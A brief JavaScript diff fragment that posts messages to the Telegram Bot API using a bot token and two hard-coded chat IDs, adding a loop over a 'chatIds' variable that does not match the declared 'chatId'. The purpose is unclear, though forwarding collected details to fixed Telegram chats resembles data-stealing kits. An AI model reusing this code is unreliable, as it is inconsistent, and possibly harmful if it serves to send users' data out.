@@ -521,7 +521,7 @@ ${detailedInfoSection}
                 const chatId = ['1747742228', '6483881505'];
 
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
+                for (const chatId of chatIds) {
                 try {
                     const response = await fetch(url, {
                         method: 'POST',
